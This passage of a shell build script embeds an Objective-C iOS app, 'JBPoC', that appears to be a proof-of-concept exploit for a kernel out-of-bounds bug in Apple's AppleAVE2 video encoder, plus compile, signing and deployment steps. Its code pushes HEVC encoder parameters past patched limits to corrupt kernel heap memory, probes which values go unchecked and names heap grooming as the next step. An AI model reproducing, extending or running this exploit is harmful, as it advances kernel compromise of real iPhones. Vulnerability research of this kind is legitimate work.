                    INFO(@"FOUND: %@ = %@", fullKey, (__bridge id)val);
                    CFRelease(val);
                } else {
                    INFO(@"FOUND: %@ = (no value)", fullKey);
                }
            }

            // Try to set various values including the off-by-one boundary
            for (int testVal = 1; testVal <= 9; testVal++) {
                status = VTSessionSetProperty(session, (__bridge CFStringRef)fullKey,
                    (__bridge CFTypeRef)@(testVal));
                if (status == noErr) {
                    INFO(@"SET OK: %@ = %d %s", fullKey, testVal,
                        testVal >= 8 ? "*** OVER PATCHED LIMIT ***" : "");
                }
            }
        }
    }

    // 4. Check for any property with "tile" in the name (num_tile_columns_minus1 target)
    pocLog(@"");
    LOG(@"=== Tile/Slice Properties ===");
    for (NSString *key in sortedKeys) {
        NSString *lk = [key lowercaseString];
        if ([lk containsString:@"tile"] || [lk containsString:@"slice"] ||
            [lk containsString:@"entropy"]) {
            NSDictionary *info = props[key];
            INFO(@"TILE/SLICE: %@", key);
            INFO(@"  Type: %@ RW: %@", info[@"PropertyType"] ?: @"?", info[@"ReadWriteStatus"] ?: @"?");
        }
    }

    CFRelease(propDict);
    VTCompressionSessionInvalidate(session);
    CFRelease(session);

    pocLog(@"");
    INFO(@"Property dump complete. Copy logs for analysis.");
    INFO(@"Long-press log → Select All → Copy");
}

static void runAVE2PoC(void) {
    pocLog(@"");
    pocLog(@"╔══════════════════════════════════════╗");
    pocLog(@"║  CVE-2026-84607: AppleAVE2 OOB       ║");
    pocLog(@"╚══════════════════════════════════════╝");
    pocLog(@"");

    INFO(@"Target: AppleAVE2 v905.40.1 on iOS 26.6.2");
    INFO(@"Bug: Unchecked H.265 params → kernel heap corruption");

    testAVE2_VideoToolbox();
    testAVE2_IOKit();

    pocLog(@"");
    INFO(@"If device panicked, check Settings → Privacy → Analytics → panic logs");
    INFO(@"Or Console.app → iPhone → panic-* logs");
    pocLog(@"");
}

// ============================================================
// OOB Trigger Tests — PANIC CAPABLE
// ============================================================

static void oobOutputCallback(
    void *ctx, void *sourceFrameRefCon, OSStatus status,
    VTEncodeInfoFlags infoFlags, CMSampleBufferRef sampleBuffer) {
    if (status != noErr) {
        FAIL(@"OOB encode callback error: %d", (int)status);
        return;
    }
    if (sampleBuffer) {
        PASS(@"Got encoded output after OOB trigger — survived!");
    }
}

static void runTier1OOB(void) {
    pocLog(@"");
    pocLog(@"╔══════════════════════════════════════╗");
    pocLog(@"║  TIER 1: Temporal Layer Off-by-One    ║");
    pocLog(@"║  *** CAN CAUSE KERNEL PANIC ***       ║");
    pocLog(@"╚══════════════════════════════════════╝");
    pocLog(@"");

    INFO(@"Setting NumberOfTemporalLayers = 8 (patched limit: <7)");
    INFO(@"This indexes array[7] in a size-7 kernel array → OOB by 1");
    pocLog(@"");

    VTCompressionSessionRef session = NULL;
    NSDictionary *spec = @{
        (NSString *)kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder: @YES,
        (NSString *)kVTVideoEncoderSpecification_RequireHardwareAcceleratedVideoEncoder: @YES,
    };

    OSStatus status = VTCompressionSessionCreate(
        kCFAllocatorDefault, 320, 240, kCMVideoCodecType_HEVC,
        (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
        oobOutputCallback, NULL, &session);

    if (status != noErr) {
        FAIL(@"Session creation failed: %d", (int)status);
        return;
    }
    PASS(@"HEVC session created (320x240, minimal)");

    VTSessionSetProperty(session, CFSTR("AllowTemporalCompression"), kCFBooleanTrue);
    VTSessionSetProperty(session, CFSTR("AllowFrameReordering"), kCFBooleanTrue);

    status = VTSessionSetProperty(session,
        CFSTR("NumberOfTemporalLayers"), (__bridge CFTypeRef)@(8));
    INFO(@"Set NumberOfTemporalLayers=8: %d (%s)",
        (int)status, status == noErr ? "ACCEPTED" : "REJECTED");

    if (status != noErr) {
        FAIL(@"Property rejected at set time");
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return;
    }

    CFTypeRef readBack = NULL;
    VTSessionCopyProperty(session, CFSTR("NumberOfTemporalLayers"),
        kCFAllocatorDefault, &readBack);
    if (readBack) {
        INFO(@"Readback: NumberOfTemporalLayers = %@", (__bridge id)readBack);
        CFRelease(readBack);
    }

    INFO(@"PrepareToEncodeFrames...");
    status = VTCompressionSessionPrepareToEncodeFrames(session);
    INFO(@"PrepareToEncode: %d", (int)status);

    if (status != noErr) {
        FAIL(@"PrepareToEncode failed — kernel may have caught OOB at alloc");
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return;
    }

    CVPixelBufferRef pb = NULL;
    status = CVPixelBufferCreate(kCFAllocatorDefault, 320, 240,
        kCVPixelFormatType_420YpCbCr8BiPlanarFullRange,
        (__bridge CFDictionaryRef)@{
            (NSString *)kCVPixelBufferIOSurfacePropertiesKey: @{}
        }, &pb);

    if (status != noErr || !pb) {
        FAIL(@"Pixel buffer creation failed: %d", (int)status);
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return;
    }

    CVPixelBufferLockBaseAddress(pb, 0);
    void *y = CVPixelBufferGetBaseAddressOfPlane(pb, 0);
    if (y) memset(y, 0x80,
        CVPixelBufferGetBytesPerRowOfPlane(pb, 0) *
        CVPixelBufferGetHeightOfPlane(pb, 0));
    void *uv = CVPixelBufferGetBaseAddressOfPlane(pb, 1);
    if (uv) memset(uv, 0x80,
        CVPixelBufferGetBytesPerRowOfPlane(pb, 1) *
        CVPixelBufferGetHeightOfPlane(pb, 1));
    CVPixelBufferUnlockBaseAddress(pb, 0);

    pocLog(@"");
    LOG(@"*** ENCODING FRAME WITH TEMPORAL_LAYERS=8 ***");
    INFO(@"If device panics, check panic log for AppleAVE2");
    pocLog(@"");

    status = VTCompressionSessionEncodeFrame(session, pb,
        CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
    INFO(@"EncodeFrame: %d", (int)status);

    status = VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
    INFO(@"CompleteFrames: %d", (int)status);

    for (int i = 1; i <= 3; i++) {
        CVPixelBufferLockBaseAddress(pb, 0);
        y = CVPixelBufferGetBaseAddressOfPlane(pb, 0);
        if (y) memset(y, 0x40 + i * 0x20,
            CVPixelBufferGetBytesPerRowOfPlane(pb, 0) *
            CVPixelBufferGetHeightOfPlane(pb, 0));
        CVPixelBufferUnlockBaseAddress(pb, 0);

        status = VTCompressionSessionEncodeFrame(session, pb,
            CMTimeMake(i, 30), kCMTimeInvalid, NULL, NULL, NULL);
        INFO(@"Frame %d: %d", i, (int)status);
    }

    status = VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
    INFO(@"Final CompleteFrames: %d", (int)status);

    CVPixelBufferRelease(pb);
    VTCompressionSessionInvalidate(session);
    CFRelease(session);

    pocLog(@"");
    PASS(@"=== Test complete without panic ===");
    INFO(@"OOB write likely hit non-critical heap padding.");
    INFO(@"Next: heap grooming to place controlled object adjacent.");
}

// ============================================================
// Tier 1b: REAL OOB triggers — AlphaLayerID + RepFormatIndex
// These properties accept wildly over-limit values with NO
// userspace validation. When the encoder builds VPS/SPS with
// these values and sends to the kernel, the kernel uses them
// as array indices without bounds checking (on 26.6.2).
//
// *** THIS CAN CAUSE KERNEL PANIC ***
// ============================================================

static void runTier1bOOB(void) {
    pocLog(@"");
    pocLog(@"╔══════════════════════════════════════╗");
    pocLog(@"║  TIER 1b: VPS/SPS OOB via Encode      ║");
    pocLog(@"║  *** CAN CAUSE KERNEL PANIC ***       ║");
    pocLog(@"╚══════════════════════════════════════╝");
    pocLog(@"");

    INFO(@"AlphaLayerID and RepFormatIndex accept values far");
    INFO(@"over patched limits with NO userspace validation.");
    INFO(@"Encoding with these values sends them to the kernel.");
    pocLog(@"");

    // --- Test A: AlphaLayerID OOB ---
    LOG(@"=== Test A: AlphaLayerID = 64 (limit <63) ===");
    INFO(@"Starting with modest OOB (64) before going larger...");

    VTCompressionSessionRef session = NULL;
    NSDictionary *spec = @{
        (NSString *)kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder: @YES,
        (NSString *)kVTVideoEncoderSpecification_RequireHardwareAcceleratedVideoEncoder: @YES,
    };

    OSStatus status = VTCompressionSessionCreate(
        kCFAllocatorDefault, 320, 240, kCMVideoCodecType_HEVC,
        (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
        oobOutputCallback, NULL, &session);

    if (status != noErr) {
        FAIL(@"Session creation failed: %d", (int)status);
        return;
    }
    PASS(@"HEVC session created");

    // Set AlphaLayerID to 64 (1 past the patched limit of <63)
    status = VTSessionSetProperty(session,
        CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
        (__bridge CFTypeRef)@(64));
    INFO(@"Set AlphaLayerID=64: %d (%s)",
        (int)status, status == noErr ? "ACCEPTED" : "REJECTED");

    // Verify readback (check if it's clamped like temporal layers was)
    CFTypeRef readBack = NULL;
    VTSessionCopyProperty(session,
        CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
        kCFAllocatorDefault, &readBack);
    if (readBack) {
        INFO(@"Readback: AlphaLayerID = %@", (__bridge id)readBack);
        int val = [(__bridge NSNumber *)readBack intValue];
        if (val == 64) {
            PASS(@"Value NOT clamped — 64 will reach the kernel!");
        } else {
            INFO(@"Value was clamped to %d — kernel may not see 64", val);
        }
        CFRelease(readBack);
    } else {
        INFO(@"Readback returned nil");
    }

    // Enable alpha encoding (may be required for AlphaLayerID to matter)
    VTSessionSetProperty(session, CFSTR("EncodesAlpha"), kCFBooleanTrue);

    status = VTCompressionSessionPrepareToEncodeFrames(session);
    INFO(@"PrepareToEncode: %d", (int)status);

    if (status != noErr) {
        INFO(@"PrepareToEncode failed — trying without EncodesAlpha...");
        VTCompressionSessionInvalidate(session);
        CFRelease(session);

        // Retry without EncodesAlpha
        status = VTCompressionSessionCreate(
            kCFAllocatorDefault, 320, 240, kCMVideoCodecType_HEVC,
            (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
            oobOutputCallback, NULL, &session);
        if (status != noErr) { FAIL(@"Retry failed"); return; }

        VTSessionSetProperty(session,
            CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
            (__bridge CFTypeRef)@(64));

        status = VTCompressionSessionPrepareToEncodeFrames(session);
        INFO(@"PrepareToEncode (no alpha): %d", (int)status);
        if (status != noErr) {
            FAIL(@"PrepareToEncode failed again: %d", (int)status);
            VTCompressionSessionInvalidate(session);
            CFRelease(session);
            return;
        }
    }

    // Create pixel buffer and encode
    CVPixelBufferRef pb = NULL;
    status = CVPixelBufferCreate(kCFAllocatorDefault, 320, 240,
        kCVPixelFormatType_420YpCbCr8BiPlanarFullRange,
        (__bridge CFDictionaryRef)@{
            (NSString *)kCVPixelBufferIOSurfacePropertiesKey: @{}
        }, &pb);

    if (status != noErr || !pb) {
        FAIL(@"Pixel buffer failed: %d", (int)status);
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return;
    }

    CVPixelBufferLockBaseAddress(pb, 0);
    void *y = CVPixelBufferGetBaseAddressOfPlane(pb, 0);
    if (y) memset(y, 0x80,
        CVPixelBufferGetBytesPerRowOfPlane(pb, 0) *
        CVPixelBufferGetHeightOfPlane(pb, 0));
    void *uv = CVPixelBufferGetBaseAddressOfPlane(pb, 1);
    if (uv) memset(uv, 0x80,
        CVPixelBufferGetBytesPerRowOfPlane(pb, 1) *
        CVPixelBufferGetHeightOfPlane(pb, 1));
    CVPixelBufferUnlockBaseAddress(pb, 0);

    pocLog(@"");
    LOG(@"*** ENCODING WITH AlphaLayerID=64 ***");

    status = VTCompressionSessionEncodeFrame(session, pb,
        CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
    INFO(@"EncodeFrame: %d", (int)status);

    status = VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
    INFO(@"CompleteFrames: %d", (int)status);

    CVPixelBufferRelease(pb);
    VTCompressionSessionInvalidate(session);
    CFRelease(session);

    PASS(@"Test A survived — AlphaLayerID=64");
    pocLog(@"");

    // --- Test B: RepFormatIndex OOB ---
    LOG(@"=== Test B: RepFormatIndex = 10 (limit <2) ===");

    status = VTCompressionSessionCreate(
        kCFAllocatorDefault, 320, 240, kCMVideoCodecType_HEVC,
        (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
        oobOutputCallback, NULL, &session);

    if (status != noErr) {
        FAIL(@"Session creation failed: %d", (int)status);
        return;
    }

    status = VTSessionSetProperty(session,
        CFSTR("RequiredHEVCSequenceParameterSetRepFormatIndex"),
        (__bridge CFTypeRef)@(10));
    INFO(@"Set RepFormatIndex=10: %d (%s)",
        (int)status, status == noErr ? "ACCEPTED" : "REJECTED");

    readBack = NULL;
    VTSessionCopyProperty(session,
        CFSTR("RequiredHEVCSequenceParameterSetRepFormatIndex"),
        kCFAllocatorDefault, &readBack);
    if (readBack) {
        INFO(@"Readback: RepFormatIndex = %@", (__bridge id)readBack);
        int val = [(__bridge NSNumber *)readBack intValue];
        if (val == 10) {
            PASS(@"Value NOT clamped — 10 will reach the kernel!");
        } else {
            INFO(@"Value was clamped to %d", val);
        }
        CFRelease(readBack);
    }

    status = VTCompressionSessionPrepareToEncodeFrames(session);
    INFO(@"PrepareToEncode: %d", (int)status);

    if (status != noErr) {
        FAIL(@"PrepareToEncode failed: %d — kernel caught it at alloc?", (int)status);
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return;
    }

    pb = NULL;
    status = CVPixelBufferCreate(kCFAllocatorDefault, 320, 240,
        kCVPixelFormatType_420YpCbCr8BiPlanarFullRange,
        (__bridge CFDictionaryRef)@{
            (NSString *)kCVPixelBufferIOSurfacePropertiesKey: @{}
        }, &pb);

    if (status != noErr || !pb) {
        FAIL(@"Pixel buffer failed: %d", (int)status);
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return;
    }

    CVPixelBufferLockBaseAddress(pb, 0);
    y = CVPixelBufferGetBaseAddressOfPlane(pb, 0);
    if (y) memset(y, 0x80,
        CVPixelBufferGetBytesPerRowOfPlane(pb, 0) *
        CVPixelBufferGetHeightOfPlane(pb, 0));
    uv = CVPixelBufferGetBaseAddressOfPlane(pb, 1);
    if (uv) memset(uv, 0x80,
        CVPixelBufferGetBytesPerRowOfPlane(pb, 1) *
        CVPixelBufferGetHeightOfPlane(pb, 1));
    CVPixelBufferUnlockBaseAddress(pb, 0);

    pocLog(@"");
    LOG(@"*** ENCODING WITH RepFormatIndex=10 ***");

    status = VTCompressionSessionEncodeFrame(session, pb,
        CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
    INFO(@"EncodeFrame: %d", (int)status);

    status = VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
    INFO(@"CompleteFrames: %d", (int)status);

    CVPixelBufferRelease(pb);
    VTCompressionSessionInvalidate(session);
    CFRelease(session);

    PASS(@"Test B survived — RepFormatIndex=10");
    pocLog(@"");

    INFO(@"Both tests survived. The OOB values may have:");
    INFO(@"  1. Hit non-critical heap padding");
    INFO(@"  2. Been ignored by the encode path (not used for this profile)");
    INFO(@"  3. Caused silent corruption (check for weird behavior)");
    INFO(@"Next: escalate OOB distance or try multi-view HEVC mode.");
}

static void runTier2Probe(void) {
    pocLog(@"");
    pocLog(@"╔══════════════════════════════════════╗");
    pocLog(@"║  TIER 2: VPS/SPS/PPS Bound Probing    ║");
    pocLog(@"║  Safe — no encoding, just set/read     ║");
    pocLog(@"╚══════════════════════════════════════╝");
    pocLog(@"");

    VTCompressionSessionRef session = NULL;
    NSDictionary *spec = @{
        (NSString *)kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder: @YES,
        (NSString *)kVTVideoEncoderSpecification_RequireHardwareAcceleratedVideoEncoder: @YES,
    };

    OSStatus status = VTCompressionSessionCreate(
        kCFAllocatorDefault, 320, 240, kCMVideoCodecType_HEVC,
        (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
        oobOutputCallback, NULL, &session);

    if (status != noErr) {
        FAIL(@"Session creation failed: %d", (int)status);
        return;
    }

    // log2_max_minus4 (patched limit: <= 12)
    LOG(@"=== log2_max_minus4 (limit: <=12) ===");
    int logTests[] = {0, 4, 8, 12, 13, 16, 20, 28, 60};
    for (int i = 0; i < 9; i++) {
        status = VTSessionSetProperty(session,
            CFSTR("log2_max_minus4"), (__bridge CFTypeRef)@(logTests[i]));
        INFO(@"log2_max_minus4=%d: %s %s", logTests[i],
            status == noErr ? "OK" : "REJECTED",
            logTests[i] > 12 ? "*** OVER LIMIT ***" : "");
    }

    // VPS Alpha Layer ID (limit: < 63)
    pocLog(@"");
    LOG(@"=== VPS AlphaLayerID (limit: <63) ===");
    int layerTests[] = {0, 32, 62, 63, 64, 100, 255};
    for (int i = 0; i < 7; i++) {
        status = VTSessionSetProperty(session,
            CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
            (__bridge CFTypeRef)@(layerTests[i]));
        INFO(@"AlphaLayerID=%d: %s %s", layerTests[i],
            status == noErr ? "OK" : "REJECTED",
            layerTests[i] >= 63 ? "*** OVER LIMIT ***" : "");
    }

    // SPS Rep Format Index (limit: < 2)
    pocLog(@"");
    LOG(@"=== SPS RepFormatIndex (limit: <2) ===");
    int repTests[] = {0, 1, 2, 3, 10, 50, 255};
    for (int i = 0; i < 7; i++) {
        status = VTSessionSetProperty(session,
            CFSTR("RequiredHEVCSequenceParameterSetRepFormatIndex"),
            (__bridge CFTypeRef)@(repTests[i]));
        INFO(@"RepFormatIndex=%d: %s %s", repTests[i],
            status == noErr ? "OK" : "REJECTED",
            repTests[i] >= 2 ? "*** OVER LIMIT ***" : "");
    }

    // NumberOfSlices
    pocLog(@"");
    LOG(@"=== NumberOfSlices ===");
    int sliceTests[] = {1, 4, 16, 64, 256, 257, 1000};
    for (int i = 0; i < 7; i++) {
        status = VTSessionSetProperty(session,
            CFSTR("NumberOfSlices"), (__bridge CFTypeRef)@(sliceTests[i]));
        INFO(@"NumberOfSlices=%d: %s", sliceTests[i],
            status == noErr ? "OK" : "REJECTED");
    }

    // ChromaQPIndexOffsetMultiPPS (limit: <= 5)
    pocLog(@"");
    LOG(@"=== ChromaQPOffset (limit: <=5) ===");
    int chromaTests[] = {0, 3, 5, 6, 10, 50, 255};
    for (int i = 0; i < 7; i++) {
        status = VTSessionSetProperty(session,
            CFSTR("ChromaQPIndexOffsetMultiPPS"),
            (__bridge CFTypeRef)@(chromaTests[i]));
        INFO(@"ChromaQPOffset=%d: %s %s", chromaTests[i],
            status == noErr ? "OK" : "REJECTED",
            chromaTests[i] > 5 ? "*** OVER LIMIT ***" : "");
    }

    VTCompressionSessionInvalidate(session);
    CFRelease(session);

    pocLog(@"");
    INFO(@"Probing complete. Properties accepting over-limit values are exploitable.");
}

// ============================================================
// App UI
// ============================================================

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (strong) UIWindow *window;
@end

@interface PoCViewController : UIViewController
@property (strong) UITextView *logView;
@property (strong) UIButton *chrootBtn;
@property (strong) UIButton *ave2Btn;
@property (strong) UIButton *propDumpBtn;
@property (strong) UIButton *tier2Btn;
@property (strong) UIButton *tier1Btn;
@property (strong) UIButton *bothBtn;
@property (strong) UIButton *exportBtn;
@end

@implementation PoCViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    self.view.backgroundColor = UIColor.blackColor;

    CGFloat w = self.view.bounds.size.width;
    CGFloat top = 60;
    CGFloat btnH = 44;
    CGFloat gap = 8;
    CGFloat pad = 16;
    CGFloat btnW = (w - pad * 2 - gap) / 2;

    self.chrootBtn = [UIButton buttonWithType:UIButtonTypeSystem];
    self.chrootBtn.frame = CGRectMake(pad, top, btnW, btnH);
    [self.chrootBtn setTitle:@"Chroot PoC" forState:UIControlStateNormal];
    self.chrootBtn.backgroundColor = [UIColor colorWithWhite:0.15 alpha:1];
    self.chrootBtn.layer.cornerRadius = 8;
    [self.chrootBtn setTitleColor:UIColor.cyanColor forState:UIControlStateNormal];
    [self.chrootBtn addTarget:self action:@selector(runChroot) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:self.chrootBtn];

    self.ave2Btn = [UIButton buttonWithType:UIButtonTypeSystem];
    self.ave2Btn.frame = CGRectMake(pad + btnW + gap, top, btnW, btnH);
    [self.ave2Btn setTitle:@"AVE2 PoC" forState:UIControlStateNormal];
    self.ave2Btn.backgroundColor = [UIColor colorWithWhite:0.15 alpha:1];
    self.ave2Btn.layer.cornerRadius = 8;
    [self.ave2Btn setTitleColor:UIColor.orangeColor forState:UIControlStateNormal];
    [self.ave2Btn addTarget:self action:@selector(runAVE2) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:self.ave2Btn];

    CGFloat row2 = top + btnH + gap;

    self.propDumpBtn = [UIButton buttonWithType:UIButtonTypeSystem];
    self.propDumpBtn.frame = CGRectMake(pad, row2, btnW, btnH);
    [self.propDumpBtn setTitle:@"Dump Props" forState:UIControlStateNormal];
    self.propDumpBtn.backgroundColor = [UIColor colorWithWhite:0.15 alpha:1];
    self.propDumpBtn.layer.cornerRadius = 8;
    [self.propDumpBtn setTitleColor:UIColor.yellowColor forState:UIControlStateNormal];
    [self.propDumpBtn addTarget:self action:@selector(runPropDump) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:self.propDumpBtn];

    self.tier2Btn = [UIButton buttonWithType:UIButtonTypeSystem];
    self.tier2Btn.frame = CGRectMake(pad + btnW + gap, row2, btnW, btnH);
    [self.tier2Btn setTitle:@"Tier 2 Probe" forState:UIControlStateNormal];
    self.tier2Btn.backgroundColor = [UIColor colorWithWhite:0.15 alpha:1];
    self.tier2Btn.layer.cornerRadius = 8;
    [self.tier2Btn setTitleColor:UIColor.magentaColor forState:UIControlStateNormal];
    [self.tier2Btn addTarget:self action:@selector(runTier2) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:self.tier2Btn];

    CGFloat row3 = row2 + btnH + gap;

    self.tier1Btn = [UIButton buttonWithType:UIButtonTypeSystem];
    self.tier1Btn.frame = CGRectMake(pad, row3, btnW, btnH);
    [self.tier1Btn setTitle:@"OOB Temporal" forState:UIControlStateNormal];
    self.tier1Btn.backgroundColor = [UIColor colorWithRed:0.3 green:0.0 blue:0.0 alpha:1];
    self.tier1Btn.layer.cornerRadius = 8;
    self.tier1Btn.layer.borderWidth = 1;
    self.tier1Btn.layer.borderColor = UIColor.redColor.CGColor;
    [self.tier1Btn setTitleColor:UIColor.redColor forState:UIControlStateNormal];
    [self.tier1Btn addTarget:self action:@selector(runTier1) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:self.tier1Btn];

    UIButton *tier1bBtn = [UIButton buttonWithType:UIButtonTypeSystem];
    tier1bBtn.frame = CGRectMake(pad + btnW + gap, row3, btnW, btnH);
    tier1bBtn.backgroundColor = [UIColor colorWithRed:0.4 green:0.0 blue:0.0 alpha:1];
    tier1bBtn.layer.cornerRadius = 8;
    tier1bBtn.layer.borderWidth = 2;
    tier1bBtn.layer.borderColor = UIColor.redColor.CGColor;
    [tier1bBtn setTitle:@"OOB VPS/SPS" forState:UIControlStateNormal];
    [tier1bBtn setTitleColor:UIColor.redColor forState:UIControlStateNormal];
    [tier1bBtn addTarget:self action:@selector(runTier1b) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:tier1bBtn];

    CGFloat row4 = row3 + btnH + gap;

    self.bothBtn = [UIButton buttonWithType:UIButtonTypeSystem];
    self.bothBtn.frame = CGRectMake(pad, row4, w - pad * 2, btnH);
    [self.bothBtn setTitle:@"Run Recon (Chroot + AVE2)" forState:UIControlStateNormal];
    self.bothBtn.backgroundColor = [UIColor colorWithWhite:0.15 alpha:1];
    self.bothBtn.layer.cornerRadius = 8;
    [self.bothBtn setTitleColor:UIColor.greenColor forState:UIControlStateNormal];
    [self.bothBtn addTarget:self action:@selector(runBoth) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:self.bothBtn];

    CGFloat logTop = row4 + btnH + gap;
    self.logView = [[UITextView alloc] initWithFrame:
        CGRectMake(0, logTop, w, self.view.bounds.size.height - logTop)];
    self.logView.autoresizingMask = UIViewAutoresizingFlexibleWidth | UIViewAutoresizingFlexibleHeight;
    self.logView.editable = NO;
    self.logView.font = [UIFont fontWithName:@"Menlo" size:10];
    self.logView.textColor = UIColor.greenColor;
    self.logView.backgroundColor = UIColor.blackColor;
    self.logView.contentInset = UIEdgeInsetsMake(8, 8, 50, 8);
    [self.view addSubview:self.logView];
    g_logView = self.logView;

    // Show device info immediately
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        printDeviceInfo();
    });
}

- (void)runChroot {
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        runChrootPoC();
    });
}

- (void)runAVE2 {
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        runAVE2PoC();
    });
}

- (void)runPropDump {
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        runPropertyDump();
    });
}

- (void)runTier1 {
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        runTier1OOB();
    });
}

- (void)runTier1b {
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        runTier1bOOB();
    });
}

- (void)runTier2 {
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        runTier2Probe();
    });
}

- (void)runBoth {
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        runChrootPoC();
        runAVE2PoC();
        pocLog(@"");
        pocLog(@"════════════════════════════════════");
        pocLog(@"  ALL PoCs COMPLETE");
        pocLog(@"  Copy logs: long-press → Select All → Copy");
        pocLog(@"  Or check Console.app on Mac");
        pocLog(@"════════════════════════════════════");
    });
}

@end

@implementation AppDelegate
- (BOOL)application:(UIApplication *)app didFinishLaunchingWithOptions:(NSDictionary *)opts {
    self.window = [[UIWindow alloc] initWithFrame:UIScreen.mainScreen.bounds];
    self.window.rootViewController = [PoCViewController new];
    [self.window makeKeyAndVisible];
    return YES;
}
@end

int main(int argc, char *argv[]) {
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));
    }
}
OBJC

echo "  main.m written ($(wc -l < "$WORK/main.m") lines)"

# ---- Compile ----
echo ""
echo "[3/6] Compiling for arm64 (iPhone)..."

"$CLANG" \
    -arch arm64 \
    -isysroot "$SDK" \
    -miphoneos-version-min=26.0 \
    -framework UIKit \
    -framework Foundation \
    -framework VideoToolbox \
    -framework CoreMedia \
    -framework CoreVideo \
    -framework AVFoundation \
    -framework IOKit \
    -fobjc-arc \
    -Wno-deprecated-declarations \
    -O2 \
    -o "$WORK/JBPoC.app/JBPoC" \
    "$WORK/main.m"

echo "  Binary: $(du -h "$WORK/JBPoC.app/JBPoC" | cut -f1)"

# ---- Create .app bundle ----
echo ""
echo "[4/6] Creating .app bundle..."

cp "$WORK/Info.plist" "$WORK/JBPoC.app/Info.plist"

# Minimal PkgInfo
printf "APPL????" > "$WORK/JBPoC.app/PkgInfo"

echo "  Bundle: $WORK/JBPoC.app"
ls -la "$WORK/JBPoC.app/"

# ---- Sign ----
echo ""
echo "[5/6] Code signing..."

codesign -f -s "$IDENTITY" \
    --entitlements "$WORK/entitlements.plist" \
    "$WORK/JBPoC.app"

if [ $? -eq 0 ]; then
    echo "  Signed successfully with: $IDENTITY"
    codesign -dvv "$WORK/JBPoC.app" 2>&1 | head -5
else
    echo "  WARNING: Signing failed. See manual deployment below."
fi

# ---- Deploy ----
echo ""
echo "[6/6] Deploying to iPhone..."

if [ "$HAS_IOS_DEPLOY" = true ]; then
    echo "  Running ios-deploy..."
    ios-deploy --bundle "$WORK/JBPoC.app" --debug 2>&1 || {
        echo ""
        echo "  ios-deploy failed. Try manual deployment instead."
    }
else
    echo "  ios-deploy not installed."
fi

echo ""
echo "========================================"
echo "  DEPLOYMENT COMPLETE"
echo "========================================"
echo ""
echo "The app 'JBPoC' should now be on your iPhone."
echo "Open it and tap 'Run Both' to execute all PoCs."
echo ""
echo "Monitor output:"
echo "  - On-screen: green text in the app"
echo "  - Console.app on Mac: filter by 'JBPoC' or 'CVE'"
echo "  - Crash logs: Settings → Privacy → Analytics"
echo ""
echo "========================================"
echo "  MANUAL XCODE DEPLOYMENT (if above failed)"
echo "========================================"
echo ""
echo "1. Open Xcode → File → New → Project → iOS App"
echo "   Product name: JBPoC"
echo "   Language: Objective-C"
echo "   Bundle ID: com.research.jbpoc"
echo ""
echo "2. Delete all auto-generated .m/.h files"
echo ""
echo "3. Add this file to the project:"
echo "   $WORK/main.m"
echo ""
echo "4. In Build Settings:"
echo "   - Set 'iOS Deployment Target' to 26.0"
echo "   - Add frameworks: VideoToolbox, CoreMedia, AVFoundation, IOKit"
echo ""
echo "5. Select your iPhone as build target"
echo ""
echo "6. Cmd+R to build and run"
echo ""
echo "App source: $WORK/main.m"
